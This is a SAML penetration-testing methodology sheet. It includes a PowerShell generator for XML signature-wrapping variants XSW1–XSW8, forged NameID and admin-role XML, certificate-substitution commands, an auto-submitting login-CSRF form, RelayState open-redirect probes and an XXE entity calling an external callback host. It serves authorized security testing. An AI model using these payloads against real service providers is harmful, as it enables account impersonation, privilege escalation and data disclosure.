# SAML

## Flow and Fields

* **SP** -> Service provider; the application issuing the local session. **IdP** -> Identity provider signing the login assertion. **ACS** -> SP endpoint receiving `SAMLResponse`.
* **SP-initiated flow** -> SP sends `SAMLRequest` (`AuthnRequest`) to IdP -> user authenticates -> browser POSTs `SAMLResponse` to ACS -> SP validates it and creates a session.
* **IdP-initiated flow** -> IdP sends an unsolicited response to ACS without a preceding SP request. Missing `InResponseTo` can be expected here; check whether this mode is intended.
* **Binding** -> HTTP-POST normally carries Base64 XML in a form parameter. HTTP-Redirect normally uses URL encoding + Base64 + raw DEFLATE for `SAMLRequest`. Decode according to the actual binding; Base64 is not encryption.
* **Map these values from the existing flow:**
  * `Issuer` -> trusted IdP entity ID, not necessarily a URL that is fetched.
  * `Destination` & `SubjectConfirmationData/@Recipient` -> intended ACS URL.
  * `Audience` -> SP entity ID, not necessarily its ACS URL.
  * `Response/@InResponseTo` & `SubjectConfirmationData/@InResponseTo` -> originating `AuthnRequest/@ID`.
  * `NameID`, email, groups, role & tenant attributes -> identity and permissions the SP consumes.
  * `Conditions` & `SubjectConfirmationData` timestamps -> assertion validity; `AuthnInstant` -> authentication time.
  * `ds:Reference/@URI` -> signed element ID. Check whether the response, assertion, or both are signed.
  * `RelayState` -> return location or opaque flow state; usually outside the XML signature in POST binding.
* **Tools** -> [SAML Raider](https://github.com/SAMLRaider/SAMLRaider) for message editing, certificate substitution & wrapping variants. Re-encode edited XML using the original binding. For Redirect signatures, preserve the original encoded parameter bytes and signed parameter order unless deliberately testing signature failure.
* **Encrypted assertions** -> `EncryptedAssertion` hides inner claims. Use an available test-SP decryption key or IdP-generated test assertions; outer XML edits do not test validation of encrypted inner claims.

## Quick Test Order

* [Signature Validation](saml.md#signature-validation) -> [Certificate Trust](saml.md#certificate-trust) -> [XML Signature Wrapping](saml.md#xml-signature-wrapping) -> [Replay and Request Correlation](saml.md#replay-and-request-correlation) -> [Audience, Recipient, and Time](saml.md#audience-recipient-and-time) -> [Identity and Tenant Mapping](saml.md#identity-and-tenant-mapping) -> [RelayState and Login CSRF](saml.md#relaystate-and-login-csrf) -> [XML Parser Tests](saml.md#xml-parser-tests).
* **Result check for every login test:** use a session without an existing SP login, then check the resulting account ID, tenant & one protected operation. An ACS `200`, redirect, or unchanged logged-in page alone does not demonstrate acceptance.
* **Signature dependency:** modifying a signed claim invalidates its digest. For semantic tests such as audience/time validation, use a test IdP trusted by the SP to issue the variant, or an exposed unsigned field. Rejection at signature verification does not establish that the semantic check works.

## Tools and Fast Tests

* **SAML Raider (Burp extension)** -> Install from `Extensions` -> `BApp Store` -> `SAML Raider`. Its message editor decodes supported bindings, removes signatures, signs assertions/messages, inserts XSW variants & generates XXE/XSLT payloads. Its certificate manager creates/clones certificates and imports certificates/private keys.
* **Fast XSW run:** start each variant from the original response, not the previous mutated result. Configure the XSW match/replace mapping with the exact original `NameID` or consumed attribute text and the test identity/role. Select `XSW1` through `XSW8` as applicable and apply the variant. Inspect which copy changed before submitting; without an identity change, an accepted wrapper does not demonstrate impersonation.
* **Signature exclusion:** use Raider's signature removal actions, then change the consumed identity. See [Signature Validation](saml.md#signature-validation) for response/assertion/both variants.
* **Certificate substitution:** create/clone a certificate with a key you control, change the identity, then sign the assertion/message with that key. Cloning the public certificate alone does not reproduce the IdP's private key. See [Certificate Trust](saml.md#certificate-trust).
* **Burp Comparer** -> Compare the decoded original/mutated XML to locate the moved signed element, changed IDs & unsigned identity. Compare resulting sessions/account identifiers separately; matching HTTP status codes do not establish the same authentication result.
* **SAML-tracer (browser extension, optional)** -> Inspect decoded SAML messages and browser flow transitions; useful for checking the SP/IdP/ACS relationship. It is not a signature-bypass or XSW generation tool.
* **XXE/XSLT generation:** Raider includes these payload actions, but choose the parser-specific test rather than running every action blindly. Use raw mode for [XXE](saml.md#external-entity-resolution) so the extension does not parse/rewrite the payload first.
* **Repeatability:** if the previous attempt consumed the assertion/request ID, use a fresh equivalent response for the next variant. Otherwise replay protection or expiry can mask whether the wrapping mutation worked.

## Signature Validation

* **Unsigned identity change:** change `NameID` from account A to account B, leaving signatures unchanged. Repeat separately for the email attribute and the application's actual role/group attribute.
  * ```xml
    <saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">user-b@example.com</saml:NameID>
    ```
  * ```xml
    <saml:Attribute xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Name="role">
      <saml:AttributeValue>admin</saml:AttributeValue>
    </saml:Attribute>
    ```
* **Remove signatures:** remove the response-level `ds:Signature`, assertion-level signature, then both, as separate variants. For each accepted variant, change the identity or role and repeat. A correctly validated assertion signature can make an unsigned outer response legitimate; signature removal alone is not proof of bypass.
* **Corrupt signature:** change one Base64 character inside `SignatureValue` while keeping the XML and Base64 valid; separately change one character in `DigestValue`. Do not re-sign.
* **Remove signature internals:** remove `SignedInfo`, `SignatureValue`, or the whole `Reference` one at a time; pair any accepted variant with an identity mutation.
* **Confirm:** SP issues a new session as B or grants the changed privilege despite no valid trusted signature covering that identity. Acceptance of an unchanged assertion only shows which signature layer was required.

## Certificate Trust

* **Embedded certificate substitution:** generate a key/certificate, change A's identity to B, sign the changed assertion/response with that key, and embed the certificate in `ds:KeyInfo/ds:X509Data/ds:X509Certificate`. Re-sign each required layer, assertion first if the response also signs it.
* **OpenSSL 3.x installed; same commands on Linux Bash / Windows PowerShell:**
  * ```
    openssl req -x509 -newkey rsa:2048 -keyout saml-test.key -out saml-test.crt -sha256 -days 7 -noenc -subj "/CN=saml-test"
    openssl pkey -in saml-test.key -traditional -out saml-test-rsa.key
    ```
* Import `saml-test.crt` and the traditional RSA PEM key `saml-test-rsa.key` into SAML Raider for signing. Changing only `X509Certificate` without re-signing does not test whether the SP trusts attacker-supplied keys.
* **Variants:** embedded tester certificate; empty/removed `KeyInfo` with tester signature; a different tenant IdP's certificate. A certificate copied from metadata is public and cannot generate a valid signature without its private key.
* **Confirm:** changed identity accepted using a key that is not trusted for the target tenant/IdP. Trust must come from configured IdP metadata/keys, not whichever certificate the message includes.

## XML Signature Wrapping

* **Logic:** signature verification validates one element while application code consumes a different assertion or identity node.
* **Pick the signed layer:** `XSW1`/`XSW2` target response signatures; `XSW3`-`XSW8` target assertion signatures. If both layers are signed, an outer signature can reject an otherwise applicable assertion-wrapping mutation.
* **SAML Raider variants:** these numbers identify the extension's implementations, not an exhaustive taxonomy of all wrapping attacks. "Original" below means the original identity content retained as the signature reference target; in some variants the signature element is relocated outside that target.

<table><thead><tr><th width="76">Variant</th><th width="101">Baseline</th><th>Structure generated / identity to change</th></tr></thead><tbody><tr><td><code>XSW1</code></td><td>Response signed</td><td>Original response content is nested inside the outer <code>Signature</code>; outer response gets a new ID and the modified identity. The reference still targets the nested original response ID.</td></tr><tr><td><code>XSW2</code></td><td>Response signed</td><td>Original response content is inserted before the outer <code>Signature</code>; outer response gets a new ID and the modified identity. Tests nested-response selection versus signature reference resolution.</td></tr><tr><td><code>XSW3</code></td><td>Assertion signed</td><td>Unsigned modified assertion with a new ID is inserted before the original signed assertion. Tests first-assertion selection.</td></tr><tr><td><code>XSW4</code></td><td>Assertion signed</td><td>Original signed assertion is moved inside an unsigned modified assertion with a new ID. Tests outer assertion consumption versus nested signature validation.</td></tr><tr><td><code>XSW5</code></td><td>Assertion signed</td><td>Original assertion content, without its signature child, is appended after the modified assertion. The signature remains on the modified assertion, which gets a new ID, but references the original content's ID.</td></tr><tr><td><code>XSW6</code></td><td>Assertion signed</td><td>Original assertion content, without its signature child, is placed inside the modified assertion's <code>Signature</code>. Modified assertion gets a new ID; the reference targets the nested original content.</td></tr><tr><td><code>XSW7</code></td><td>Assertion signed</td><td>Unsigned modified assertion is placed in an <code>Extensions</code> wrapper before the original signed assertion. The generated clone retains the original ID, also probing duplicate-ID resolution.</td></tr><tr><td><code>XSW8</code></td><td>Assertion signed</td><td>Original assertion content, without its signature child, is placed in an <code>Object</code> wrapper inside the modified assertion's <code>Signature</code>. The generated copies retain the same ID, probing duplicate-ID resolution and signature-object traversal.</td></tr></tbody></table>

* **Assertion-signed baseline:** retain the original signed assertion unchanged with its original ID and signature reference. Add a second, unsigned assertion with a new ID and B's identity. Try it before and after the signed assertion; then test the nesting/wrapper variants above.
* **Generate all eight payloads from a real response (PowerShell 7, Windows / Linux):** save the decoded original as `response.xml`; change the two identity values below. The generator changes exact matches in `NameID` and email attributes; replace the email attribute name in the XPath with the actual consumed attribute name if different. No IdP private key is needed for wrapping.
  * ```powershell
    $baselineXml = Get-Content -Raw -Encoding utf8 './response.xml'
    $originalIdentity = 'user-a@example.com'
    $replacementIdentity = 'user-b@example.com'
    $samlXsw = [ordered]@{}

    foreach ($variant in 1..8) {
      $document = [System.Xml.XmlDocument]::new()
      $document.PreserveWhitespace = $true
      $document.XmlResolver = $null
      $document.LoadXml($baselineXml)
      $namespaces = [System.Xml.XmlNamespaceManager]::new($document.NameTable)
      $namespaces.AddNamespace('saml', 'urn:oasis:names:tc:SAML:2.0:assertion')
      $namespaces.AddNamespace('ds', 'http://www.w3.org/2000/09/xmldsig#')
      $response = $document.DocumentElement
      if ($response.LocalName -ne 'Response') { throw 'Expected a SAML Response root' }
      $target = if ($variant -le 2) { $response } else {
        $response.SelectSingleNode('./saml:Assertion', $namespaces)
      }
      if ($null -eq $target) { continue }
      $signature = $target.SelectSingleNode('./ds:Signature', $namespaces)
      if ($null -eq $signature) { continue }
      $targetId = $target.GetAttribute('ID')
      $references = @($signature.SelectNodes('./ds:SignedInfo/ds:Reference', $namespaces))
      if (-not $targetId -or -not ($references | Where-Object {
        $_.GetAttribute('URI') -ceq "#$targetId"
      })) { continue }

      $original = $target.CloneNode($true)
      $unsigned = $target.CloneNode($true)
      [void]$unsigned.RemoveChild($unsigned.SelectSingleNode('./ds:Signature', $namespaces))
      $unsigned.SetAttribute('ID', "_xsw${variant}_unsigned")
      $changed = if ($variant -in 3, 4, 7) { $unsigned } else { $target }
      $identityNodes = $changed.SelectNodes(
        './/saml:NameID | .//saml:Attribute[@Name="email"]/saml:AttributeValue',
        $namespaces
      )
      $matches = 0
      foreach ($identityNode in $identityNodes) {
        if ($identityNode.InnerText -ceq $originalIdentity) {
          $identityNode.InnerText = $replacementIdentity
          $matches++
        }
      }
      if ($matches -eq 0) { throw "XSW${variant}: original identity not found; adjust values/XPath" }
      if ($variant -in 1, 2, 5, 6) { $target.SetAttribute('ID', "_xsw${variant}_unsigned") }
      if ($variant -in 1, 2, 5, 6, 8) {
        [void]$original.RemoveChild($original.SelectSingleNode('./ds:Signature', $namespaces))
      }
      switch ($variant) {
        1 { [void]$signature.AppendChild($original) }
        2 { [void]$target.InsertBefore($original, $signature) }
        3 { [void]$response.InsertBefore($unsigned, $target) }
        4 {
          [void]$response.AppendChild($unsigned)
          [void]$unsigned.AppendChild($target)
        }
        5 { [void]$response.AppendChild($original) }
        6 { [void]$signature.AppendChild($original) }
        7 {
          $unsigned.SetAttribute('ID', $targetId)
          $extensions = $document.CreateElement('Extensions')
          [void]$response.InsertBefore($extensions, $target)
          [void]$extensions.AppendChild($unsigned)
        }
        8 {
          $object = $document.CreateElement('Object')
          [void]$signature.AppendChild($object)
          [void]$object.AppendChild($original)
        }
      }
      $xml = $document.OuterXml
      $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($xml))
      $samlXsw["XSW$variant"] = [pscustomobject]@{
        Xml = $xml
        Base64 = $base64
        FormField = 'SAMLResponse=' + [Uri]::EscapeDataString($base64)
      }
    }
    $samlXsw.Keys
    ```
* **Use one generated variant:** `.Xml` is decoded XML for inspection; `.Base64` is the form parameter value; `.FormField` is the encoded name/value pair for a raw POST body. Replace only the original `SAMLResponse` pair and retain the transaction's other form fields. This is POST-binding output, not Redirect-binding DEFLATE output.
  * ```powershell
    $samlXsw['XSW3'].Xml
    $samlXsw['XSW3'].Base64
    $samlXsw['XSW3'].FormField
    ```
* **Skipped variants:** absent keys mean the input lacks that signed layer or a same-element `#ID` reference. An encrypted assertion needs decryption first. To test signatures independently when both layers exist, use the matching baseline/variant; the generator does not repair the outer signature.
* **Signature check:** the generator retains original signature values and reference IDs; it does not re-sign or guarantee a valid digest after XML serialization/relocation. Compare the signed subtree's namespaces and transforms if the SP reports a digest failure. Do not repair it with your own key, which would turn this into a certificate-trust test.
* **Response-signed baseline:** adding children normally breaks the response signature. Use wrapping variants that retain the referenced signed response subtree while exposing a separate application-consumed node; do not treat a broken outer signature as a working XSW PoC.
* **ID confusion:** duplicate an assertion's `ID` on a second assertion, then reverse element order. Separately test alternate parser-recognized ID attributes such as `xml:id`. Preserve the original signed subtree; some variants will fail schema/signature validation and are parser-dependent.
* **Wrapper/namespace variants:** inspect generated `Extensions`/`Object` namespaces and try schema-appropriate `samlp:Extensions` / `ds:Object` placements where relevant. These are structural mutations, not interchangeable tags; namespace changes and moved ancestor context can change canonicalization and break the digest.
* **Duplicate attributes are a separate parser/mapping test:** see [Identity and Tenant Mapping](saml.md#identity-and-tenant-mapping). They become XSW only when the consumed identity is outside the content actually protected by the validated signature.
* **Confirm:** the signature still validates for A's original element, but the SP session or authorization uses B's unsigned identity/role. An XML error or a second assertion ignored by the SP is not a bypass.

## Replay and Request Correlation

* **Assertion replay:** submit the exact already-consumed `SAMLResponse` again in a separate SP session while it is still within its validity window. Keep assertion/response IDs unchanged. Check for a fresh authenticated session; repeat after logout to distinguish a new login from an existing session.
* **Cross-session response:** start SP login transactions A and B in separate browser sessions. Deliver A's unused response to B's callback transaction without changing the signed XML. Keep B's flow cookie/RelayState, then try A's RelayState separately.
* **Correlation fields:** with a trusted test IdP, issue separate responses with missing, random, already-consumed, or other-session `InResponseTo`. Test both the response and bearer `SubjectConfirmationData` fields; one correct field may mask an unchecked second field.
* **Request ID examples:** replace the real request ID with each value in independently signed variants.
  * ```
    _nonexistent-request
    _already-consumed-request
    _request-from-session-b
    ```
* **Concrete correlation mutation:** starting with both fields set to the current `_request-a`, change only the response field as below; next restore it and change only `SubjectConfirmationData/@InResponseTo`; finally change both. Retain the real issuer, assertion, status, timestamps & signature structure omitted from this field-only example. Have the trusted test IdP sign each variant where the edited field is covered.
  * ```xml
    <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                    ID="_response-a" Version="2.0" InResponseTo="_nonexistent-request">
      <saml:Assertion ID="_assertion-a" Version="2.0">
        <saml:Subject>
          <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
            <saml:SubjectConfirmationData InResponseTo="_request-a"
                Recipient="https://sp.example/saml/acs" />
          </saml:SubjectConfirmation>
        </saml:Subject>
      </saml:Assertion>
    </samlp:Response>
    ```
* **Unsolicited response:** send a valid IdP response without initiating an SP login. Acceptance alone can be intended IdP-initiated SSO; demonstrate an unintended session/account switch or acceptance where only SP-initiated SSO is configured.
* **Confirm:** an already-used assertion creates a fresh session, or a response authenticates a browser transaction it was not bound to. Assertion validity duration is not a substitute for one-time-use enforcement.

## Audience, Recipient, and Time

* Use independently signed test-IdP variants for signed fields. Keep other conditions valid so one failure does not mask another.
* **Audience:** replace the SP entity ID with another SP's entity ID; remove `AudienceRestriction`; add a second restriction whose audience does not match. Audiences inside one restriction are alternatives; separate restrictions must each be satisfied.
  * ```xml
    <saml:AudienceRestriction xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
      <saml:Audience>https://other-sp.example/metadata</saml:Audience>
    </saml:AudienceRestriction>
    ```
* **Destination/Recipient:** test the wrong ACS host, wrong tenant ACS path, HTTP instead of HTTPS, and missing values independently. Include the `Destination` on the response and `Recipient` on bearer `SubjectConfirmationData`.
  * ```
    https://other-sp.example/saml/acs
    https://sp.example/tenant-b/saml/acs
    http://sp.example/saml/acs
    ```
* **Cross-SP use:** submit an unmodified valid assertion issued for SP A to SP B that trusts the same IdP. If the outer response destination blocks it, use an IdP-issued response addressed to B containing an assertion restricted to A to isolate audience enforcement.
* **Expired assertion:** let a valid unused response expire, then submit it without changing XML. For a trusted-IdP variant, set both `Conditions/@NotOnOrAfter` and `SubjectConfirmationData/@NotOnOrAfter` in the past; also isolate each field separately.
* **Future assertion:** set `Conditions/@NotBefore` well into the future. Test offsets beyond configured clock skew, for example 10 minutes, rather than a few seconds. `NotOnOrAfter` is exclusive.
* **Generate fresh UTC test values (PowerShell 7, Windows / Linux):** use these in assertions issued by the trusted test IdP. Keep the untested fields within their normal validity window.
  * ```powershell
    $now = [DateTimeOffset]::UtcNow
    $validStart = $now.AddMinutes(-1).ToString('yyyy-MM-ddTHH:mm:ssZ')
    $validEnd = $now.AddMinutes(5).ToString('yyyy-MM-ddTHH:mm:ssZ')
    $expiredStart = $now.AddMinutes(-30).ToString('yyyy-MM-ddTHH:mm:ssZ')
    $expiredEnd = $now.AddMinutes(-15).ToString('yyyy-MM-ddTHH:mm:ssZ')
    $futureStart = $now.AddMinutes(15).ToString('yyyy-MM-ddTHH:mm:ssZ')
    $futureEnd = $now.AddMinutes(20).ToString('yyyy-MM-ddTHH:mm:ssZ')
    "Baseline: Conditions NotBefore=$validStart NotOnOrAfter=$validEnd; bearer NotOnOrAfter=$validEnd"
    "Expired Conditions only: NotBefore=$expiredStart NotOnOrAfter=$expiredEnd; bearer NotOnOrAfter=$validEnd"
    "Expired bearer only: Conditions NotBefore=$validStart NotOnOrAfter=$validEnd; bearer NotOnOrAfter=$expiredEnd"
    "Future Conditions: NotBefore=$futureStart NotOnOrAfter=$futureEnd; bearer NotOnOrAfter=$futureEnd"
    ```
* **Authentication freshness:** where step-up/fresh authentication is required, send an IdP-signed assertion with an old `AuthnInstant`, or a weaker `AuthnContextClassRef` than the SP requested. Compare with the protected action's actual freshness/MFA policy.
* **Confirm:** a new SP session or protected action succeeds despite the wrong audience/recipient, expired/not-yet-valid assertion, or unmet freshness requirement. Record the exact field and time offset that was accepted.

## Identity and Tenant Mapping

* **NameID versus email:** issue a trusted signed assertion with A's `NameID` and B's email attribute, then reverse them. Check which identifier controls account lookup, just-in-time provisioning & account linking.
* **User-editable IdP attributes:** change a profile field at the IdP, obtain a normal signed assertion, and check whether it selects an existing account or assigns privileges at the SP. This tests mapping without bypassing signatures.
* **Role/group mapping:** use the real attribute names and accepted values. With a trusted test IdP, test an unassigned group, admin role, and duplicate role attributes in reversed order.
  * ```xml
    <saml:Attribute xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Name="groups">
      <saml:AttributeValue>users</saml:AttributeValue>
      <saml:AttributeValue>administrators</saml:AttributeValue>
    </saml:Attribute>
    ```
* **Cross-tenant IdP trust:** use tenant A's legitimately signed response at tenant B's ACS/login route. Also vary unsigned tenant selectors in the URL or RelayState while retaining A's assertion. Check issuer + signing key + account mapping together, not merely whether both tenants use the same IdP hostname.
* **Issuer substitution:** change `Issuer` to another IdP entity ID in a response signed by A's IdP; use a test IdP that can issue this variant. Acceptance can show that the key is trusted globally instead of being bound to the asserted issuer/tenant.
* **Duplicate identity attributes:** send two email attributes or two values with A/B identities; reverse order. Include case variants only where the application's identity policy treats them differently.
* **Confirm:** A's legitimate IdP identity becomes B's existing account, crosses a tenant boundary, or gains an unmapped privilege. A role explicitly assigned by the configured trusted IdP is not itself a vulnerability.

## RelayState and Login CSRF

### RelayState Redirects

* Replace only `RelayState` in a valid ACS submission; test each candidate separately. If the application uses opaque state rather than a URL, swap state values between transactions instead of assuming URL interpretation.
  * ```
    https://callback.example/saml-relay-probe
    //callback.example/saml-relay-probe
    https://sp.example@callback.example/saml-relay-probe
    https://sp.example.callback.example/saml-relay-probe
    /\callback.example/saml-relay-probe
    ```
* Let the form encoder encode each value once; test additional encoding only when a second decoding layer is observed. For signed Redirect messages, changing signed `RelayState` should invalidate the binding signature.
* **Confirm:** the SP completes login and navigates to the external destination. This proves an open redirect; claim assertion/token leakage only if that data is actually forwarded to the external endpoint.

### Login CSRF

* Use an unused, still-valid SAML response for account A. Serve the form from another origin and open it in a separate browser session. Keep the actual ACS parameter names; include A's RelayState if the endpoint requires it.
  * ```html
    <!doctype html>
    <meta charset="utf-8">
    <title>SAML Login Test</title>
    <form method="post" action="https://sp.example/saml/acs">
      <input type="hidden" name="SAMLResponse" value="REPLACE_WITH_BASE64_RESPONSE_FOR_A">
      <input type="hidden" name="RelayState" value="REPLACE_WITH_A_RELAYSTATE">
      <button type="submit">Submit</button>
    </form>
    <script>document.forms[0].submit();</script>
    ```
* **Confirm:** the separate browser is silently logged into A's SP account or its existing account is switched to A. Check the actual account identifier after the POST; cross-site cookie restrictions and intended IdP-initiated login affect the result.

## XML Parser Tests

### Comment and Text Handling

* **Identity splitting:** replace a consumed `NameID` or email text node with a comment-split equivalent. XML text concatenates to the same value, but inconsistent application parsing may consume only the prefix. Keep signatures unchanged first; use a trusted signed variant to isolate application parsing if required.
  * ```xml
    <saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">user-b@example.com<!--split-->.test</saml:NameID>
    ```
* **Canonicalization dependency:** comment insertion may preserve the digest when the reference transform excludes comments; it will not if comments are included or other signed bytes change. Check the actual reference transforms.
* **Confirm:** IdP authenticated the full identity `user-b@example.com.test`, but the SP logs into the existing `user-b@example.com` account. Rejection or use of the full text is not a bypass.

### External Entity Resolution

* Insert this declaration before the original response root, after any XML declaration. Replace a parsed text field such as `NameID` with `&samlprobe;`, then re-encode the message. Use a unique callback hostname/path per attempt. Use SAML Raider's raw mode to avoid parsing/rewriting this payload before submission.
  * ```xml
    <!DOCTYPE samlp:Response [
      <!ENTITY samlprobe SYSTEM "https://callback.example/saml-xxe-001">
    ]>
    ```
* **Confirm:** a server-side DNS/HTTP callback from the SP parser, or controlled callback content in a parser result. A signature error can occur after entity resolution; distinguish the SP request from browser/tool preview fetching. Further payloads: [XXE](xml-external-entity-xxe-injection.md).

## Logout and Session Enforcement

* **SP logout:** after logout, reuse the old SP session cookie on a protected endpoint. Separately replay the consumed SAML response; these test session invalidation and assertion replay respectively.
* **Single Logout enabled:** initiate IdP logout, then try the old SP cookie again. Check each participating SP against the deployment's logout contract; SP-only logout does not necessarily terminate the IdP session.
* **Logout message validation:** change `NameID` or `SessionIndex` in a `LogoutRequest`, remove its signature, or replay a consumed `LogoutResponse`. For Redirect binding, test the query signature rather than assuming an XML signature exists. Confirm an unrelated test session is terminated or an uncorrelated logout response is accepted as completion.

## References

* [OWASP - SAML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)
* [SAML Raider](https://github.com/SAMLRaider/SAMLRaider)
* [SAML Raider - XSW1-XSW8 implementation](https://github.com/CompassSecurity/SAMLRaider/blob/master/src/main/java/helpers/XSWHelpers.java)
* [OASIS - SAML 2.0 Specifications](https://docs.oasis-open.org/security/saml/v2.0/)
